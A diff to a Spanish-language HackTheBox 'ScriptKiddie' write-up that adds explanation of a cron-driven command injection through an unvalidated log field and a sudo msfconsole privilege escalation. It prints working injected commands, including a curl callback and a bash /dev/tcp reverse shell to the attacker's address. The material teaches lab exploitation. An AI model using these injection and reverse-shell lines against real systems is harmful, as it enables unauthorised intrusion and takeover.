@@ -369,11 +369,21 @@ kid@scriptkiddie:~/html$ stty rows 46 columns 230
 
 ## Pivoting to pwn
 
-
-
 ### Abusing Logs + Cron Jonb (Command Injection)
 
+Realizando enumeración en el directorio `/home`, nos encontramos con el directorio personal de un nuevo usuario llamado `pwn`. Este directorio contenía otro directorio llamado `recon` el cual no disponíamos de acceso y de un script llamado `scanlosers.sh` el cual no podíamos ejecutar pero si visualizar su contenido.
 
+El script extrae direcciones IP de un archivo de logs, elimina duplicados y escanea los 10 puertos más comunes con Nmap, guardando los resultados en `recon/{IP}.nmap`. Luego, si el log tiene contenido, lo vacía.
+
+#### Posible **Command Injection**
+
+La línea `while read ip; do sh -c "nmap ... ${ip}" & done` usa `sh -c`, lo que permite ejecución de comandos si `$log` contiene una entrada manipulada, como:
+
+```bash
+echo "malicious_ip; whoami" >> /home/kid/logs/hackers
+```
+
+Si el script lo procesa, ejecutará `whoami`.
 
 ```bash
 kid@scriptkiddie:/home/pwn$ ls -l
@@ -396,7 +406,13 @@ done
 if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
 ```
 
-/home/kid/html/app.py
+Por otro lado, también comprobamos que podemos revisar la configuración de la aplicación web que hemos logrado vulnerar anteriormente. La configuración se encuentra en el siguiente script de Python: `/home/kid/html/app.py`.
+
+A través del usuario `kid`, tenemos la capacidad de revisar el código. Si recordamos, anteriormente intentamos realizar un **Command Injection** en la herramienta `searchsploit` dentro de la aplicación web. En respuesta, se nos mostró un mensaje indicando que dejáramos de intentar hackear la aplicación, e incluso nos amenazaba con hacer lo mismo contra nosotros.
+
+Al analizar el código de la aplicación, encontramos el siguiente contenido:
+
+Este código abre el archivo `/home/kid/logs/hackers` y registra la fecha y hora actuales, junto con la `srcip` proporcionada en la aplicación web. Luego, muestra el mensaje: `stop hacking me - well hack you back`.
 
 {% code title="app.py" %}
 ```bash
@@ -411,13 +427,29 @@ def searchsploit(text, srcip):
 ```
 {% endcode %}
 
+La variable `regex_alphanum` se define en el código de la siguiente manera:
 
+* Esta regex solo permite letras (`A-Z, a-z`), números (`0-9`), espacios y puntos (`.`).
+* Gracias a esta validación, no es posible inyectar caracteres especiales en `text`, lo que evita un **Command Injection directo** en `searchsploit`.
+*
+  * Si el input `text` no cumple con la regex, la aplicación escribe la dirección `srcip` en el archivo `/home/kid/logs/hackers`.
+  * Problema: `srcip` no pasa por ninguna validación, lo que permite manipular su contenido.
 
 ```bash
 regex_alphanum = re.compile(r'^[A-Za-z0-9 \.]+$')
 ```
 
+Para verificar el formato con el cual se almacenan las entradas en el archivo `/home/kid/logs/hackers`, realizamos la siguiente comprobación desde nuestro equipo local utilizando Python 3.
 
+El resultado obtenido fue el siguiente formato:
+
+* `[2025-03-02 17:40:10.917029] 10.10.14.2`
+
+De este modo, confirmamos que los logs siguen el formato:
+
+* `[YYYY-MM-DD HH:MM:SS.microsegundos] IP`
+
+Este formato se utiliza para registrar las direcciones IP en el archivo de logs, permitiéndonos manipular srcip sin ningún tipo de validación o filtrado.
 
 ```python
 ❯ python3
@@ -429,7 +461,13 @@ Type "help", "copyright", "credits" or "license" for more information.
 '[2025-03-02 17:40:10.917029] 10.10.14.2\n'
 ```
 
+Realizamos una prueba de escritura simulada en el archivo de logs `/home/kid/logs/hackers`, utilizando el formato indicado en la aplicación web.
 
+Ejecutamos el siguiente comando: `echo '[2025-03-02 17:40:10.917029] 10.10.14.2' > hackers`, y luego comprobamos el contenido del archivo con `cat hackers`, obteniendo el resultado `[2025-03-02 17:40:10.917029] 10.10.14.2`.
+
+Posteriormente, insertamos un comando de pausa y, después de 1 segundo, volvimos a verificar el archivo con `echo 'pause'; sleep 1; cat hackers; echo 'done'`, observando que el contenido desaparecía.
+
+Esto sugiere que el script se ejecutó automáticamente al recibir el log simulado, lo que implica que podría haber una tarea programada (como una tarea cron) o algún proceso en segundo plano que limpia los logs inmediatamente después de procesarlos. Además, es posible que el script sea ejecutado por el usuario `pwn`, quien es el propietario del script, lo que indicaría que dicho usuario tiene configurado algún mecanismo que activa la ejecución del script al escribir en el archivo de logs.
 
 ```bash
 kid@scriptkiddie:~/logs$ echo '[2025-03-02 17:40:10.917029] 10.10.14.2' > hackers; cat hackers; echo 'pause'; sleep 1; cat hackers; echo 'done'
@@ -438,14 +476,41 @@ pause
 done
 ```
 
+Volvimos a comprobar el funcionamiento del script, el cual revisa el contenido del archivo `/home/kid/logs/hackers` para obtener el tercer valor de cada línea (en este caso, la dirección IP) utilizando el comando `cut`. A continuación, el script utiliza `sort` para ordenar y obtener un listado único de IPs. Luego, para cada IP obtenida, ejecuta un escaneo de puertos con `nmap` en segundo plano para las 10 principales puertos. El resultado de cada escaneo se guarda en un archivo en el directorio `recon/`, pero la salida estándar y de error se redirige a `/dev/null` para ocultar la salida.
 
+El script también incluye una verificación para comprobar si el archivo de logs contiene alguna línea; si es así, borra el contenido del archivo.
+
+{% code title="scanlosers.sh" %}
+```bash
+#!/bin/bash
+
+log=/home/kid/logs/hackers
+
+cd /home/pwn/
+cat $log | cut -d' ' -f3- | sort -u | while read ip; do
+    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
+done
+
+if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
+```
+{% endcode %}
+
+Realizamos una prueba para verificar qué valor es el que el script maneja al procesar el archivo de logs. Ejecutamos el siguiente comando en el sistema:
+
+* `echo '[2025-03-02 17:40:10.917029] 10.10.14.2' | cut -d' ' -f3-`
+
+El resultado fue:
+
+* `10.10.14.2`
+
+Esto confirma que el script toma la tercera columna de cada línea en el archivo de logs, que corresponde a la dirección IP (en este caso, 10.10.14.2).&#x20;
 
 ```bash
 kid@scriptkiddie:~/logs$ echo '[2025-03-02 17:40:10.917029] 10.10.14.2' | cut -d' ' -f3- 
 10.10.14.2
 ```
 
-
+El valor extraído es luego utilizado por el script en la variable `ip` para realizar el escaneo de puertos con `Nmap`.
 
 {% code title="scanlosers.sh" %}
 ```bash
@@ -453,34 +518,43 @@ sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
 ```
 {% endcode %}
 
+Sin embargo, al no validar correctamente el valor de la IP, es posible que se realice un Command Injection. Para demostrar esto, realizamos una prueba en la que inyectamos un comando adicional. En este caso, aprovechamos el formato del valor extraído, ya que el script solo toma la tercera columna, sin validar su contenido completamente.
 
+Ejecutamos el siguiente comando:
+
+* `echo 'x x x 10.10.14.2; curl 10.10.14.2/gzzcoo #' | cut -d' ' -f3-`
+
+El resultado obtenido fue:
+
+* `x 10.10.14.2; curl 10.10.14.2/gzzcoo #`
+
+Aquí, la parte `10.10.14.2; curl 10.10.14.2/gzzcoo #` se inyecta correctamente en el comando, lo que indica que podemos ejecutar comandos adicionales (en este caso, un `curl`) junto con el escaneo de puertos de nmap. El `#` asegura que el resto de la línea se comente y no interfiera con el comando. Esto demuestra una vulnerabilidad de Command Injection, lo que podría permitirnos ejecutar comandos arbitrarios en el sistema.
 
 ```bash
 kid@scriptkiddie:~/logs$ echo 'x x x 10.10.14.2; curl 10.10.14.2/gzzcoo #' | cut -d' ' -f3- 
 x 10.10.14.2; curl 10.10.14.2/gzzcoo #
 ```
 
-
+La sintaxis que recibiría el script `scanlosers.sh` cuando le pasemos esos valores sería algo parecido a esto.
 
 ```bash
 nmap --top-ports 10 -oN recon/x 10.10.14.2; curl 10.10.14.2/gzzcoo #.nmap x 10.10.14.2; curl 10.10.14.2/gzzcoo # 2>&1 >/dev/null"
 ```
 
-
-
-```bash
-❯ python3 -m http.server 80
-Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
-```
-
-
+Para realizar la prueba final para verificar el `Command Injection` nos levantaremos un servidor web para ver si recibimos una petición por `GET` a un recurso inexistente.
 
 ```bash
 ❯ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
+Escribiremos el siguiente contenido en el archivo `hackers` donde llegan los logs, en este ejemplo pondremos en marcha lo explicado anteriormente.
 
+```bash
+kid@scriptkiddie:~/logs$ echo 'x x x 10.10.14.2; curl 10.10.14.2/gzzcoo #' > hackers
+```
+
+Por parte de nuestro servidor web, confirmamos que se ha realizado la petición con `cURL` hacía nuestro servidor web, confirmamos finalmente el `Command Injection`.
 
 ```bash
 ❯ python3 -m http.server 80
@@ -489,20 +563,20 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.10.10.226 - - [02/Mar/2025 18:03:45] "GET /gzzcoo HTTP/1.1" 404 -
 ```
 
-
+Por lo tanto, el siguiente paso será lograr obtener acceso a través de una Reverse Shell con el usuario que ejecuta el script, que probablemente sea `pwn`.
 
 ```bash
 ❯ nc -nlvp 444
 listening on [any] 444 ...
 ```
 
-
+Inyectaremos el siguiente código en el archivo de logs `hackers`.
 
 ```bash
 kid@scriptkiddie:~/logs$ echo "x x x 10.10.14.2; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.2/444 0>&1' #" > hackers
 ```
 
-
+Confirmaos que hemos recibido correctamente el acceso a la máquina con el usuario `pwn`.
 
 ```bash
 ❯ nc -nlvp 444
@@ -513,7 +587,7 @@ bash: no job control in this shell
 pwn@scriptkiddie:~$ 
 ```
 
-
+Al obtener la reverse shell, mejoramos la calidad de la shell con los siguientes pasos para obtener una TTY interactiva.
 
 ```bash
 ❯ nc -nlvp 444
@@ -539,7 +613,7 @@ pwn@scriptkiddie:~$ stty rows 46 columns 230
 
 ### Abusing sudoers privilege (msfconsole)
 
-
+Revisando los permisos de `sudoers` que dispone el usuario, nos encontramos que puede ejecutar el binario de `msfconsole` como usuario `root` sin proporcionar credenciales de este mismo.
 
 ```bash
 pwn@scriptkiddie:~$ sudo -l
@@ -550,7 +624,7 @@ User pwn may run the following commands on scriptkiddie:
     (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
 ```
 
-
+A través de la herramienta de [`searchbins`](https://github.com/r1vs3c/searchbins) comprobaremos la manera de explotar este binario con permisos de `sudo` sobre él. Esta herramienta tiene como funcionalidad realizar la consulta a `GTFOBins` pero localmente.
 
 ```bash
 ❯ searchbins -b msfconsole -f sudo
@@ -565,7 +639,7 @@ User pwn may run the following commands on scriptkiddie:
 	| >> system("/bin/sh")
 ```
 
-
+Realizaremos los pasos de la explotación del binario para poder ganar acceso como usuario `root`. Comprobamos que finalmente logramos obtener una `shell` como usuario`root` y podemos visualizar la flag **root.txt**.
 
 ````bash
 pwn@scriptkiddie:~$ sudo /opt/metasploit-framework-6.0.9/msfconsole 
@@ -608,5 +682,5 @@ msf6 > irb
 root@scriptkiddie:/home/pwn# whoami
 root
 root@scriptkiddie:/home/pwn# cat /root/root.txt 
-17c4d4fbd4d18cce56ed423a84b6e873
+17c4d***************************
 ````
